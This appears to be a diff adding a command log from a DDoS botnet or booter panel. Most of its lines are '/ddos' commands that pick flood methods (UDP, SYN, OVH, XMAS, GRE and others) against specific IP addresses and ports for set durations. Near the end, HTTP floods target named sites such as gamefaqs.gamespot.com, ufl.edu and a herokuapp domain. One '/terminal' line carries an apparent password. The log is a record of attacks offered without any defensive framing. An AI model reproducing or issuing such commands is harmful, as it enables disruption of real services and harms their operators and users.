@@ -1,0 +1,57 @@
+/help
+/ddos std 74.74.74.147 30 dport=80
+/ddos std 73.73.73.137 120 dport=80
+/ipcheck 73.73.73.137
+/tr4p
+/checkip 73.73.73.137
+/ping 73.73.73.137
+/methods
+/tr4p
+/terminal KigaPenetrationIsBest1337
+/ddos std 108.237.124.13 300 dport=80
+/ddos std 108.237.124.13 120 dport=80
+/ping 108.237.124.13
+/ddos std 38.128.66.45 120 dport=80
+/ping 38.128.66.45
+/plan
+/ddos vse 209.206.45.26 120 dport=55164
+/ddos udp 128.116.26.97 120 dport=60440
+/methods
+/ddos udp 128.116.44.36 120 dport=59276
+/ddos udpplain 128.116.44.36 120 dport=59276
+/ddos udpplain 128.116.44.36 120 dport=59276
+/ddos udp 128.116.44.36 120 dport=59276
+/tr4p
+/lag
+/lag udpplain 28.116.44.36 30 120 3 dport=59276
+/ddos udp 128.116.44.36 120 dport=59276
+/ddos udpplain 128.116.44.36 120 dport=59276
+/ddos std 128.116.44.36 120 dport=59276
+/ddos udpplain 128.116.44.36 120 dport=59276
+/ddos syn 128.116.44.36 120 dport=59276
+/ddos stdhex 128.116.44.36 120 dport=59276
+/ddos stdhex 128.116.44.36 120 dport=59276
+/ddos ovh 128.116.44.36 120 dport=59276
+/ddos udp 128.116.44.36 120 dport=59276
+/ddos udpplain 128.116.44.36 120 dport=59276
+/ddos udp 128.116.70.104 120 dport=50365
+/ddos udpplain 128.116.70.104 120 dport=50365
+/methods
+/ddos xmas 128.116.70.104 120 dport=50365
+/ddos xse 128.116.70.104 120 dport=50365
+/ddos ack 128.116.70.104 120 dport=50365
+/ddos udprand 128.116.70.104 120 dport=50365
+/ddos storm 128.116.70.104 120 dport=50365
+/ddos greeth 128.116.70.104 120 dport=50365
+/ddos udpplain 128.116.70.104 120 dport=50365
+/ddos http whitehouse.gove
+/ddos http whitehouse.edu
+/ddos http ufl.edu
+/ddos http 128.227.9.98
+/ddos https gamefaqs.gamespot.com 120
+/ddpps http gamefaqs.gamespot.com 120
+/ddos http gamefaqs.gamespot.com 120
+/ddos https frees-site.herokuapp.com 120
+/plan
+/plan
+/ddos std 74.74.74.147 400 dport=80
